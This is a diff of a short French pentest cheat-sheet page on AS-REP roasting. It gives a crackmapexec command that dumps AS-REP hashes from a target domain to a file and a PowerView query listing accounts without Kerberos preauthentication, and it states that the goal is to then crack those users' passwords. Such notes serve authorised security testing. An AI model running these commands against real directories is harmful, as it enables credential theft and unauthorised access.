@@ -1,10 +1,15 @@
 ---
 public: true # set to true to make the article publishable
 ---
-Obtention de la liste des utilisateurs n'ayant pas besoin de préauthentifaction
-## 
+
+Obtention de la liste des utilisateurs n'ayant pas besoin de préauthentifaction.
+
+Après obtention de cette liste, on pourra tenter de casser les mots de passe des utilisateurs.
+
+## A distance
+
 ```powershell
-cme ldap  $TARGET -u users.lst -p '' --asreproast asrep.txt
+crackmapexec ldap  $TARGET -u "$AD_USER" -p "$AD_PASSWORD" --asreproast asrep.txt
 
 Get-DomainUser -PreauthNotRequired | select samaccountname,userprincipalname,useraccountcontrol | fl
 
